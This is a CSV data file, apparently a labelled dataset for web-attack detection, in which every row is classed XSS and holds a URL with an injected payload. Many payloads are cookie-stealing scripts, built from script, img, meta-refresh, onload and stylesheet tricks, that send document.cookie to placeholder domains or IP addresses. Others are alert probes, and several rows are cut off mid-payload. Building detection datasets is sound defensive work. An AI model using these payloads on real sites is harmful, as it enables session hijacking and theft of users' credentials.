id,class,vector
18406,XSS,/9l7hL_ntt@Y/s3rWy.cgi?tx=634147614&EbMaeionhessboh=32687&Mn=9911882&Nbgale0=%3C%21--+--+--%3E%3Cscript+%3E%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.taettete.com%2Fcgi-bin%2Fenleie.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript%3E%3C%21--+--+--%3E&6oee=xtermeTnDz3Chtnac&9oitp=24&heTiuuinsn=+t&XbWhH2wmw=x&nasf=2Pm7e9k&oiasnn=454380&sepa4tt5UnrtK1=el&mpufruja0w=iTZ&YbsystemfxQ=o.M6xsIejm9
18416,XSS,/ruebi/6herybetAAreo/12rsibbA4GhH0vU45W/cuaZk7WW_zVKeRm@/i0S@9.tiff?b1iu=0483492&vvhneia9a=%3Cdiv+++style+%3D%22+++binding%3A++url%28%5Bhttp%3A%2F%2Fwww.taitan.com%2Fscript%2Fioz.aspx%5D%29%3B++%22%3E&yilytrtT87etlR=rmoNCL
18427,XSS,R7TWetcFusrjS=aQ@Ht&uamalt=doZctp]ba&cal=:ndd85ih crs&mnpEPoh=iNpei&ec0yra=8&oe=dehnwasnttr&o8m=eexec
18433,XSS,/<script>alert('Vulnerable')</script>.shtml?
18440,XSS,/mn/p4-1WsUvWoC/e@Zvq4qWYnr.2p/Ur/etyuJcQeOciq83mBdim/pWi.dVoJHN/tec4aa/dpeeym/rNnEf3OjQFVtFeb7sTAE/sl9pzHd-J.js?eGtnEpb=e_aI7.-xl&ihW.wmLAC=xjho&elre=segZFj&sii=eqacsp7e&sdcg=084994709&tranEeI=2712&picger6geAentOt=%3C%3Cscript+%3E%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.tearanve.com%2Fcgi-bin%2Freto.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript++%3E&I3rEuro=4&ru3llt8el=i0ae0aowherena8
18454,XSS,/trxhkpbs/9ssdknlQ/atnennyxoterc8dTiepe.js?ndel=r&ai=423398
18465,XSS,cgiwrap/<SCRIPT>alert(document.domain)</SCRIPT>?
18492,XSS,"liseTtliptm8h=7yuxmla02th&oNggU637t6=9686&tereaa0=<bgsound    src   =  "" javascript"
18501,XSS,/ooNehatgsx/goakhna/ar_hIDQw/a7q.pl?pCiTCheretbdua=sf%29gbtelnetxELWziuu&npIAmagEioxsn=%3Cimg++src++++%3D++++%22+++++sechalat%3E+++%22+++++onmouseover%3D++%22++%5Bwindow.open%28%27http%3A%2F%2F60.24.127.187%2Frase.php3%27%2Bdocument.cookie%29%3B%5D%22+++%3E&6ca3Gweo=yinemeldroprauhhjgo%3Fn%7El
18510,XSS,/eheusns/4OmnfsngadueEju3dR/70dxO-J1O8maF/exiviHqC_B7Inh/r1x/mxnG0n7/sroaUi5asoi/50lhZyWtZKP/gZqT/eX2DGBVqL@l4tQ.aspx?aorwe7=98232
18514,XSS,/4A0sgE1Qf/rIinsertdfx.dll?teapanior=ann%27ics2Yandalo&7owtyec5=8607128&onn0bgio7fe=1dstmwde&inr=pm9oiaeeamA&VaLDrLiframe.=e&tobvtsb9s=ologdccry+b%2Bq&locationfaxBc=%3Cinput+++++type+++%3D%22++++image++%22+++++dynsrc%3D+%22+javascript%3A++%5Bwindow.open%28%27http%3A%2F%2F154.246.115.121%2Fermare.exe%27%2Bdocument.cookie%29%3B%5D++++%22+++%3E&o6ed=%5Ba%7Clo&ut=rert%27N&eC=sdv&uxW2=275
18561,XSS,/eas/wEW/3pLPBZ78S/tonei4w7ml/Nie-JexecCBstdinOnqCgW.mspx?oteesStS5e=%3Cimg++++src++%3D+%22+mocha%3A%5Bwindow.open%28%27http%3A%2F%2F169.91.236.168%2Fanil.asp%27%2Bdocument.cookie%29%3B%5D++++++%22+++%3E&ixuagmyd=lAEaeota&bvdnlotwaQUckf3=e%40VJJ9Ps
18562,XSS,Lstu=tinserteshutdowna2bainsert4n%yvw&T4tG8c4whereBj=s38p&Askaciyt=imo&XKtyHi=5022&adewiaqktnnpd=9746996509&bihl1ilcaenvd42=chva0&nlciofn=<!-- -- --><script   >[window.open('http://249.223.67.222/se.asmx'+document.cookie);]</script><!-- -- -->&oaaoo65tiXeta=cttonol&4LZzbgsoundPMI=uOxUu8&arrssaxu=i30Aizcpcn&@BC_IJu63rcpOM=amtp&ssI2zasno=796454&eltruru=nMIc
18634,XSS,"btagayamequsa=76&di=<style  type =  ""     text/javascript   ""  >[window.open('http://90.255.210.242/aticon.bin'+document.cookie);]</style   >&BBnwKM8=oudo ls&KVOr-vfromS=lWxq&oet3nsntil=ey0U7Ym5tA&3JK.0boot.iniUo8z=rmhitoU&ooneehsa=4&M6SKtu=o0dt&6ltcyrae0nfo=tb&homfuetal=6cm(y"
18647,XSS,/<SCRIPT>/?
18754,XSS,/icflUA2mp9insertwp-kIT/xH5T0dv/tWJ1-So/nqNYWA.OJqt@cBtJRpf/nYr59wa8marsa3/lasTseeuhi2rtdjRos7A/gXvdP-VyxGVnV/qcTlmsnsctccmdyHj/Ls48aefdbtx.bin?
18778,XSS,/b@Ce/0BtPQ2VW/rimGta9/r-adTJ_LdTo/olQ9ml1x/iER/s4MkKLT/eqewmkcdjtuxearpsolb/p9tx4tvoanmzn/pNH0NIMxwJaLE8M/xEsgitrrg/bH.exe?ohhfniisihpNai=%3Cimg+++src%3D%26%7B%5Balert+%28%27srEin%27%29%3B%5D%7D%3B%3E&od5haaedrie=809&etrvwt2teufln=J9t&agpeunear3ghrt=3954624&ed38slir3oAoa=2&scCr=iUYm%406Ku
18794,XSS,/ZuRd70a5X/TIFUG/hzpneirsiiAlmLTTyiso/lI6IDJmV_eHhi0hSrE-/nunbi.nsf?ckeem9cowR=ccmdmotswiedXe&roB8innwemhltdi=Eia&SE_AbgsoundML6=%3Cmeta+++http-equiv+++%3D++%22+++++refresh%22++++content++%3D+%22++0%3Burl%3Djavascript%3A++++%5Balert++++%28%27D52saroco%27%29%3B%5D%22+++%3E&v@jrm1hhtpass=y%24winntQe&xlb1ltsndr=61146&rcqallSa=5836&es5fahdtOEdNfhi=756&Sdd=tpd&rx0gu79=e7%28idwindow.open&hejitcl4=TNes&wea9d=lEdu%40T&0ianaoH=oiofhuemtrop&pAnooEnbl4al=33870&elratsha5cjri=1%5DedybR
18813,XSS,"rgpiihei=<div    style =   ""     binding"
18817,XSS,/XNRUExJr6jQlj0Z/xoI/ubns2/umetakaccess_logtGd1gGDFT/gotiGehnUmer2ssoD/pK4vIQ9McqDMWQh11R/EFsock_stream937bgsoundu/d9A/otTSGIhgAwzE5pp/sWBR7bhvF9_tlGpFHSaz.cfm?gUD9OqRiN0=xuo&yltmw=shcxAtk&mPEsrarrmo=eeep&InasetB=qa2&lecaf=3npas%3Dmoerhe99+&epeadertn=2808754&btOc=Aunynrilzach&dnthu3dygt=%3Cimg+src%3D%26%7B%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.mach.com%2Fcgi-bin%2Ftegedeleor.cgi%27%2Bdocument.cookie%29%3B%5D%7D%3B+++%3E&PEG3o5=sflorettseqar8g&7f8ioemahUnena=r5YpMubCyZq&emxE311eecy=itw&nh9Isnskh=719&ei6eo=iUoisb&e3rcf=19&oeRo86yReuleqr=ETtswce2nqperls
18823,XSS,/raamii/h4winntD.hOshutdown/thPlioit/eiz/wHaejt/olOneukSiTsqrND/gW1OQ7-rblX4s5r7xT/ig0icMoNSH8.xY1C/sj-GY1d7cAJahsbTY.shtml?lzet8hmstR=Rji&t0sjbnv=saf2llldbC&gebrtcaiDs=sma&form0dRkmsock_streamdocumentIsD=3140&cyp=ygooro3iseUn1t&tAdhsae6w3r=041254241&hh3=475697&ds8ea60wdIsais=ee&jcsDnullsduq=laenhe+4%7Cn&giMe=%3Cbgsound+++src++%3D+%22+++++javascript%3A++%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.na.com%2Fcgi-bin%2Flasedengis.cgi%27%2Bdocument.cookie%29%3B%5D++%22++%3E&3boHo4LieHale=qOJMa0r&etuec77tctsnise=77143&anehtoa=oIoeoi5csafhtt&3i=e4qddehepSilli
18826,XSS,/bCKr@9.GC/rthoo/j3t3jSoGd0D91p9/esrk7e.msf?a4=annlli7upRbeii&niebwhd=2395056737&deu4oapV2xo=%5B%5CxC0%5D%5B%5CxBC%5Dscript++%3E%5Balert+++%28%27ifs%27%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript+%3E&Elraimnlm=1&lihye0gnej=%29+&hvsone=sss1ottd&yh6aZm=2a%40vnuaSFc
18851,XSS,/etzn7moe/ihenUmtondniapewUl/vks7svOt/2EKxgXyAANzJ1.swf?oaofpahmIen6snu=%3Cform%2Bname%3Die++%3E%3Cselect%2Bname%3Dftae++%3Ehttp%3A%2F%2Fwww.yunakt.com%2Fs%2F%3F%3C%2Fselect++++%3E%3C%2Fform++%3E&7eozT5anneqlfe=6049820&Naueu=nR
18912,XSS,kaNddnwoemco=ninsertad&qouuoydereide=toen psi&q0huaeeiodbcnuh=3&it0tdusdr=esfohtnq&ehh=4007561&ighi=3trcptaietfRfromas&ee12nbhas=:uiiLHeeengen:&xixt0koooobsvTE=o4nWV4FXBSlB
18926,XSS,/ud8Ap7Kmn/t3NKiUrmAZkKU9Q1.tiff?wgoldnLaninhl=%3Cstyle++type%3D++%22+++text%2Fjavascript++++%22++++%3E%5Bwindow.open%28%27http%3A%2F%2F169.64.135.91%2Fng.mspx%27%2Bdocument.cookie%29%3B%5D%3C%2Fstyle++%3E&SzWUPAb=+ng&uhmSdneb1eaap=wtsamti5
18927,XSS,/lho/eo4surosjv/ehQN/tTM2gA/ckR9C@/eKKVwi.png?ercwershrhess=%5B%5CxC0%5D%5B%5CxBC%5Dscript+++%3E%5Balert+++%28%27moieexe1r%27%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript+%3E&oCUzZbJvw=scb_BBTquJc%40&o6=oimgroup+by+E+%5Dlu1M&ghguPemticaslyn=ositle%3ClacheT&dein=ue2&e8arreet=l&giNE7R=mIau&8iaqseif=qnm%27oeahhhdeleteshutdown&5ewasj5z=%27xwnafj
18937,XSS,/OgloS/eO3Vj92q7Uw50NK/HxFYI/2Gu.z/dttPae7epqe7erinmTe/ot0bDt/oxwppBHGF/vHb7xgBy_BS.xkvG.png?
18990,XSS,"sot8hrlin5xans=0372710&ecljOnIauauie=sdWN&anztnhRte=259&nlfnpxagmtoi=11063&6efosdlote=h3968S&hu36celoRntla=685758&nnotbtvehfe=<link   rel   =""     stylesheet         ""    href  =""javascript"
19014,XSS,/gnu5ussdehrd9iu2ehO/esvuEankm3/s.IWA4XQ7-QrMk/n-Qxf2G7wk/nsrp4iiSrtgrB.mdb?raestezTe=%3Cimg++dynsrc%3D++++%22++++javascript%3A+%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.la.com%2Fcgi-bin%2Fetndsi.cgi%27%2Bdocument.cookie%29%3B%5D+%22+%3E&lishnszigs=3eswci&snse=3553269&y0enjofaOttwa=ytbl5R8t8&utduie8m4=otc
19026,XSS,/wJXviK/dTxhwB1TC.dll?BPZR7=%3Cbody++onload+++%3D++%22%5Balert++%28%27deesdg1a%27%29%3B%5D++%22++%3E&arr7hvec=009982&3EconnectcFY3vmocha=127188&ieansNmat0bi=lseiso7p7t9neeop&ex5Poelwdmd4q=4113396&8fvptyansi=ar&ike=Aar%5C&homekV71=58&oEzxthas53=7&qhprgni3=%3E&td1iyMit=%4012cniEt%2Bht%26o%28e%3Aq+tE
19040,XSS,9eeoioerapcn=cpzET-v67&himedPPh=257&mszad8p=enlti&uC&xtermDNRTc1jftmpw=passthrubfH&etintcdilhoh=wrMA&3K.3org8Z=tPsHS9I7Ka&antytp1ai=<<script    >[document.location.replace  ('http://www.meremane.com/cgi-bin/gentnden.cgi'+document.cookie);]</script  >&tlsr='tUarey&ntmetc48nosu=ortmpza&hene8sa10ul=we locationpassthruatebt&spb7ob3tscsitcn=eEhi @
19045,XSS,/ngBHCF8/sP9HGvKy1/ewIuwxTeeee1mi/Iarhmssetmrsehm/o_N9DwP4mEQZ1x1ofk/gabtnsngdse9al/UXY.jpeg?acarieahe3na=82&UnSdFWDv7=ue+passwd%2Fsystemwgeth2nodeftp&thpoaawDrPoaf=tootne3dja&esugqt7t8one=91622577
19053,XSS,/qXPpkJKts-r997Rxss/rnRG5G_otabmkipCIUQ/e3tyos0dM/kinF3_SBZwSJeM/Onlatonao0lrceeree/iej/aJEsyMlGVxg/estsnscno/8mLhUgoKgW-F_/a3ETY/RwPtBFstdin/kM.tiff?cA@GVsyK3nullppasswd=%3Cimg+++++src%3D++++%22+++++livescript%3A%5Balert%28%27ky9eahrt%27%29%3B%5D+++%22++++%3E&Neeeneoani0f=%2Bhi%27v&g5aadrr=A%25tfpaagr%26h&U5ipV=n6_MEFZM&temeLitad=jleee&rosEtqmwoorke=oZvp&tz1=g5d7914pnoK&Ionk620logWU=er
19127,XSS,/n./KPP_ZdEncopy1b/iWPc9cdaaaemeeig/pXsNtpb4bJHO9mE@@RB/s3hhOl3aa6oxa/fKI1sn/jerteepsrndeenmajg/hi6xfd/inwUffv.html?Sdult3OwQ0@=4&aclnpigo=e--XE&uGPHT-gq=iEnEdm6Pendq&xerfueP=eGoeWFf7U&ZAaI__qtelnetC=%3Cmeta+++++http-equiv++++%3D++%22+refresh+++%22++content+++%3D++%22+++0%3Burl%3Djavascript%3A++++%5Bwindow.open%28%27http%3A%2F%2F40.147.182.66%2Fntre.msf%27%2Bdocument.cookie%29%3B%5D++%22%3E&ntyssdt2Gqenh=1821689
19149,XSS,/nsOesayaseet/5hohvngaGzmdrps/h.A8Vb.SRaBoLVO/l_EoOfCFE/rbtcmdXQPIniUyscriptopt4/otswontmshNehteot/dsBVKZzWrB@m59Xl/nnrotaeysNateerr/tYtmnNcah4aRmeeeeo/a8F_vZmrZOLH1/TNB_f@BEBF7s/eYyO4m8R655DrU.msf?qha3a1ht6E=iR5&dphi6ebwhinwn=obfaR++++style%3Dleft%3Aexpression%28alert+%2881.llt6%29%29
19197,XSS,/6mqn/otK.bFdo_z/tjrnrnrhsoeee/gEI4g/setn2UmaN_/WsHt9D2mZOMW/r1/y8ece5oerlsue/7rw6slcmTR4glnodMauS.htm?IoRa=r73DAjPYNAo&N2tmpCU6XL4T=0607960&h0v5ACish=ihttpe2&N1winntGO5nIPA-=e%3Aeu%26+efboot.ini%25e&pduiap4v9etsod=eH7NrPnp%40n9I&dnc3uesfdIsoa=%3Cimg+++src%3D%26%7B%5Balert+%28%27uOlr1q%27%29%3B%5D%7D%3B+%3E&TS0aletmpO=neatoitaisaxrua
19227,XSS,/njwuR1m-I2K4tvsa1fl/hTYcmAtspEfeyi/X0updateuincludel0kY/soJgbt53/n@U0rsFoJ6g4Fxxp/aesx0Tnt/Saej0ymoxidibbt/liva0e6v/hd_KMqYNK/1K8CTevalcAhtpass/of1uQJqh3.pl?ax=%3Cxml+id+++%3D++%22+++++X++%22++%3E%3Ca%3E%3Cb+%3E%26lt%3Bscript%3E%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.isnadeto.com%2Fcgi-bin%2Fendenditon.cgi%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript+%3E%3B%3C%2Fb%3E%3C%2Fa+%3E%3C%2Fxml++%3E&Njobject9positionXxw=bodyoboot.inidbhoeE%2B&amFPaHwp-OCxO=992311&etutcneemiUro=5838988&Oesdi3sle1baaDe=eNweeIslencateap&3tiyiobOm8d=%27t&usrtQuN2zx=heds&neexpti=iotrbtmlpoyt&ctDfOmailii=bhFWPLLzYwW&ia=iR8LExUaz&xzohjdeitWedn=rBa.TSjGdmHl&eendrisw=lU7rPl&e3OI.xxxlzI=vho&4asno7ECi7fmHLn=9155&grahAa7feuo=9827821
19260,XSS,/tr/oR5x836L/uujyvlePGkuB/tcydw_iTWB_/6L5Aa/quimtoe5ch/dBbvzETkPQB@EL/6MtoO77aR/ihamysoTqehhcses1mh/re/Uj3Xupdatefhf.jpeg?efeusceo2lme=nisaach&RogBez=crtseya&lnbIe7zeoai=85403&2PtelnetCuEV=soRanrgteip4rfie&elU8te=%3Cxml++++id+++%3D++%22+++X+++%22+++%3E%3Ca+%3E%3Cb+%3E%26lt%3Bscript%3E%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.ndlemach.com%2Fcgi-bin%2Fmeinmasi.cgi%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript+++%3E%3B%3C%2Fb%3E%3C%2Fa+++%3E%3C%2Fxml++%3E&RBMTXNAw0q=867679&fLZdW2DSlogexecq=4oawp0rrs8drcdn
19347,XSS,/93XkFYA-tghHCueOBX7/fYOu4i/rIUk1usRT498h/lO/ESZ_nOP7/a3/frf_ZHF.BFPS/groZ8aKKN0k4dK0/ysimcn53eodieeolct.png?formSVDvsJ%ujP6=8&SomxYOs=hm9letapsemrdr&e2qlu=dySwC&hEinda=VeI3ee5nt9&ajrsbtiaf=Ptevny6rme6m&a3Tcde4l0ttr=045&seaahoeu5E3f=42352840&Fahehy=25&oh2u8=4470374&rtmadDo=e7SdZlIU9QzQ&laid3roylIRrcT=%3Cdiv++++style+++%3D%22++behaviour%3A+url%28%5Bhttp%3A%2F%2Fwww.ranserer.com%2Fscript%2FltmonsNaDc.bin%5D%29%3B+%22+++%3E&kiairet9e9th=nn7ulj&oTed=006029&owtfuimtbnelde=R%3C&QDwZrhW.IKBL=7cani
19366,XSS,/ramphgru/9G/fwbcEiers6hmH5mw/tGXV2q9/6swgmyr/ltoeCee/7irhanti/hxKN1AsE3qB29frry/cMqee7Finosia6u9Ryam.gif?dntltessr=edezeFAimtnhrin&3KnrFOstylePyG-=neahaving%3Bu6ni%28d1eam+ea&UyLANh0=063439665&pejhw7=andyse4di&enuieF=65&oxrs=u&CdiRdI=eTy8oR&den51cokIL=117394&iw2otvelmspilva=%3Cimg+++++src+++%3D%22+++livescript%3A%5Balert+++%28%27lhehaE%27%29%3B%5D+%22+++%3E&oeamNto6tood=acm&teosre3stta=unnr9lsncbeeOau&ierx7ontoSereo=2+rot%3Fya&ocnradomrrdo4=0212&mebebtTeertt9nt=jL3LzAt
19476,XSS,/S9location-f0openYzUywhtaccesdropbgsound.html?ascwelNrofohl=ea8as&rfoal4=j&re=divzdw0haodto+lm&nrp9ae=1886665618&li0nt=%3C%3Cscript%3E%5Balert%28%27siAcrNhTo%27%29%3B%5D%3C%2Fscript+%3E&erstger=hezneddlneawl&E3DgIfsdNcakxa=6&sTmkIkprbBms=8
19494,XSS,/nBf8FOWXnSpWqW0rYQ/eWVi-4Z2sSzYSNKsGc/pB/e6caeresvnrie6hi/S5ld/o7ePaylWiesCfE/k2Lr0kbqCk5z9odo/nae4stheErnf5lCoa/I0EarutlxpwthAoioto/asie3snihi/hy/divN_1kV5C.mspx?ntohodpt=h2br&zumAwinntB0=iiG8Q&easee4KlllLt=eNm6t&cofldiio1=el5&cgs2lttebmsE5oh=864
19523,XSS,/irwn/fucnfinnti/l.60N/9i2WwS9DSybUu/cbZt5_hJVTa@LbPJsb/anmne.php3?3cLDMNISMW=330&etnarr3s9=046570&cuosltqi7iax=%3Cxml++++id++%3D++++%22+++++X+++++%22++%3E%3Ca+%3E%3Cb++++%3E%26lt%3Bscript++%3E%5Balert%28%27nxs%27%29%3B%5D%26lt%3B%2Fscript+%3E%3B%3C%2Fb++%3E%3C%2Fa%3E%3C%2Fxml++%3E&82jbbtseeoyao=oN9gr&k0Aojecchl0Wrlt=zSmcAOG&gt=lig&e0tfr2gdreO=7utrtepy%5C&XPMfVQ07=tydau8h3amctrd&qpy4i=5213
19541,XSS,/hvRgDNidreplace/sRtt1hphounurnIahei/WiframexhtpassdcopyVQ/lEet/ry2IWla3MpVDDd/EeopngAtyn1Nco/childK.shtml?4rSvwiv=278&eecmEso=393675&sr=95&westa=47603&mgYBRh=uup.Efe&lEo7aAdwefjiw2=rl2&7CJ8unGSz=aeadReehoD&Skrh=9706628&s5ootols=6583704541&TAMlOv=na&lsrncotaiAOgto=endaccess_logKNibinUIi%3Ba%255s
19563,XSS,/ssgNb/rhaldwietnTiot/i.apyhL7XWpIl56/oAMcR_g3n.php4?irikSsnesx7llg5=84230&HCeojaLtaairoct=%3Clink+++++rel+++%3D++++%22stylesheet+++%22+++href%3D%22++++javascript%3A%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.letr.com%2Fcgi-bin%2Fatleasre.cgi%27%2Bdocument.cookie%29%3B%5D+++%22++%3E
19590,XSS,/owhi5txgimu4h4omer4/pzrrpsrprar0e9aao/hiCqtntOt8tb0rsur6k/nrhNfFKY5VQ/tzv-6DCL/tyVt_m/sM/sotEdfsmngi9dOct/ivx/n43Uo-h01G2V/erot.msf?sir=12366941&t7mtezthMn0lmf=mieecho&ntesOg=adecuetpeeeo&tet=tdiatNbna6teaR4b&AU3LXURRT50=4528&ieratscntg1=711536&hsireen=lnn&tputnsres=e&5slanolsomz=%3Cdiv+++++style+++%3D+%22++++binding%3A+++url%28%5Bhttp%3A%2F%2Fwww.ngnatoie.com%2Fscript%2Faesosjr.msf%5D%29%3B+%22%3E
19765,XSS,/Mes3hIremharrM6ix/iqQt5PRLB13.css?ru4eylstsSa=93&6Naoercr=8&ei=71&ZaetisipDmein=r%22+%3E%3Cbody%2520onload%3Dalert++%28document.cookie%29%3B%3E&nmPpastihmhSe=sFuS4CI&nph-ItQR=72&h4x8c2ch5dewpO=lfmcyiHa8dmlrt&l4cxerwzyteshoj=rtey6nac&iwmtidRtOos=+un
19766,XSS,ozn79hensrr=h&XilDKTFbG=<!-- -- --><script>[window.open('http://239.95.185.24/ma.cgi'+document.cookie);]</script ><!-- -- -->
19791,XSS,/pJHX/he81tsfse.gif?ngTtrpnddEtemmi=%3Clink++++rel+%3D++%22+++++stylesheet+++%22+++++href++++%3D+%22+javascript%3A+++%5Balert%28%27nunlEbenb%27%29%3B%5D+++++%22++%3E
19817,XSS,/y4erh61ehTwo1bEn3rEe/nygf8ma0uoqTkhfi/oeofnonsonat/v5Fzdd/g6K/opb4Xabv.jsp?8g%umk0kp7wV=4%26wtcoivhrma&wxw3moX=2&riehom=oaohnzEagahn&iazqk=+djwD9ouh%2Bsf&dfkcu=89657306&rhjn=mshutdown0d&9rgyjANd=e0Dq-V&2Z_bodymPjDupdatemeta=okn%24on2%2Bmm0&Nwzrh2tNse=%5B%5CxC0%5D%5B%5CxBC%5Dscript+++%3E%5Bwindow.open%28%27http%3A%2F%2F170.27.88.130%2Fli.dll%27%2Bdocument.cookie%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript+++%3E
19828,XSS,"teTws=I 8et&include4SvHPjM=ea""    ><body%20onload=alert  (document.cookie);    >&uIwhkt9wiue=4233795&IhtnHQhbi=ebabeiimaoe"
19892,XSS,/n_bW4JOLPZawJPeH/1fromc_dV30/b9_XLCCXGc/unsryqOdsfGrd/ttitYIyargi8nHsc/jnl/mVVB/n7veU3kctb/a-89fQkOarf4a_vCNt5c/o7F8t2_P/tteziedjhteanM4n/sgVPG-TVWvhUnIj.pl?rzh04pOmHqis=8&Elnex2oz6l=%3Cmeta++http-equiv++%3D++%22++refresh++%22+++++content+++%3D++%220%3Burl%3Djavascript%3A++++%5Bwindow.open%28%27http%3A%2F%2F8.56.136.8%2Fmeie.bin%27%2Bdocument.cookie%29%3B%5D+++++%22++%3E&svett9o=5570&rQAYZVgO2Ah=7&as=zOaDHYI&eaeitixL7onLaa=1027&lrbIb=h4hry
19903,XSS,"srl=593047&9tbcedSaVxhi2l=<body onload    =""  [document.location.replace    ('http://www.netoon.com/cgi-bin/arritimeas.cgi'+document.cookie);] "">&isrnhesEsed0sE=anfluuU~nf%2myE&eFjeH=uT6yOhAGo&at9atdRiao=n ton nnmetardeo&owaRLfeua=olin &IFVfa==nbe<h&exechttpJ5gadminl=n\4"
19964,XSS,"tseuielk0hEIh=<img     src =   ""    javascript"
19969,XSS,/rdB.jpg?vtt=464072&emb=318769&RlnodeAtS=31989&itgu=%5Bmo%40pi&i2t=hy6c&uhyn=%3A%40hr&vteoqtHoh8aO9th=303&wm@formj_include=sg_.UIQU5XS&baaoAe6c1nt4db=332810&leies1rnkcr=29&ZkfKzU=435960&4mn9ndTdBhe9=Cb&aahewaesksmu=o%28tCjmfeqO%25uixiaay
19982,XSS,/jSXSz9QZAt5y87D4UI/s-48gYHw-3iZqs5ka6/psTsrNEqKjjnrCJx0g4/eaakn/ldhXNaSK/Oeim/rHbPdQb29lzGd6OT.oci.mspx?5tmpRGCPGXU=%3Cxml+++++id+++%3D+%22+++++X++++%22+++%3E%3Ca+++%3E%3Cb+%3E%26lt%3Bscript%3E%5Balert+++%28%27Btiinn%27%29%3B%5D%26lt%3B%2Fscript++++%3E%3B%3C%2Fb++%3E%3C%2Fa%3E%3C%2Fxml+%3E&nhli0enssa3=768729964&oncrleooJudMT=hIs8mZeRSqeZ&nxlre=8&4z36ahgeeao=7&oota1atgg=p&Tr=smaccess_logtzud7lett%5C
20007,XSS,/eseKaoad/Teheti/eTirWTfunJ5G7pVOY/peytedrbftesef/hseb9akzehIc3twem5.bin?tqRrhalsht0ei7c=kZojkkwp-otl&tirertan6z2=thm4oclahqhoj5&mRalfc=%3Clink+++++rel+++%3D++++%22stylesheet+++++%22++href+++%3D++%22javascript%3A+++%5Balert+++%28%27hhgn%27%29%3B%5D%22++%3E&ueneiood=%5C+&urptAst=EiaA8rhm&E9whmiltasoiten=63015&fromCRZUG=2Jc2lZZ3IsVu&n4es0o6eLt1d=rKIZPCUJz&n4rossrerSyetbt=ee&i9=qKc5i0gx&ssp=479909077
20015,XSS,/ktoPy/0rfalaik/aTU/lsHngdeeq/Wps@Cx1sYFWR/0RJjH/gcEy6axSw9lF3G-nz_s-/09S1/4fTpsnDk365x/sAEIlerdohfEnkg/tgqheo9.swf?Rfkmit=%3Cdiv+++++style+%3D+%22binding%3A+++url%28%5Bhttp%3A%2F%2Fwww.ieonge.com%2Fscript%2FgaeroFcc.sh%5D%29%3B+++%22++%3E
20016,XSS,/nKxGWCfYhSK/iet7roy/revagc/2ohrasRirNaealc/gEUzrJLt1RVg/y_hXteyCVuNx8/b76oid@copyl/aNWr5rxTTf5pB./J.fe11M5zS_LKX/gLcS-uPN0.tiff?gpahqst=%261aeb2%24&tLn=%5B%5CxC0%5D%5B%5CxBC%5Dscript%3E%5Bwindow.open%28%27http%3A%2F%2F172.188.20.73%2Froan.php3%27%2Bdocument.cookie%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript++%3E&sekge9lmoOkthBy=62123&rdmStj=etadmintu
20022,XSS,/nxCE/l.cvB-1dMZu.html?o8eleltg=nutxmll&ceostwtptteshe=88074&hnblrtlaitm=60011&MacceptYTFx=wOqtFoZ-Xl&me0iwb=Uiueis1mz&idvtanldhsohele=82510&nurAenap=ia&ngfetb6jeu=i2BKlob.JW7&caoo=tmni&ytsslTe=h%25like&9X0z=srTasis1&tneeiva8s=%3Cxml++++src+++%3D+++%22javascript%3A+%5Bwindow.open%28%27http%3A%2F%2F216.97.198.144%2Fndla.exe%27%2Bdocument.cookie%29%3B%5D++%22+%3E&3eteomwlgtred=eThV1arUJ
20059,XSS,/cnr.aspx?74ens=%3Cdiv+++style%3D++%22+++behaviour%3A++++url%28%5Bhttp%3A%2F%2Fwww.si.com%2Fscript%2Fiecra9i7w.nsf%5D%29%3B+++++%22+++%3E&jaaarqSho=It76httpschge5zsa&jiou=ainxI7se+%3Do&1fudehoke=sr1tftpohrEmhs%3Eeh+indj&ntTal9snsYcehGe=%3De
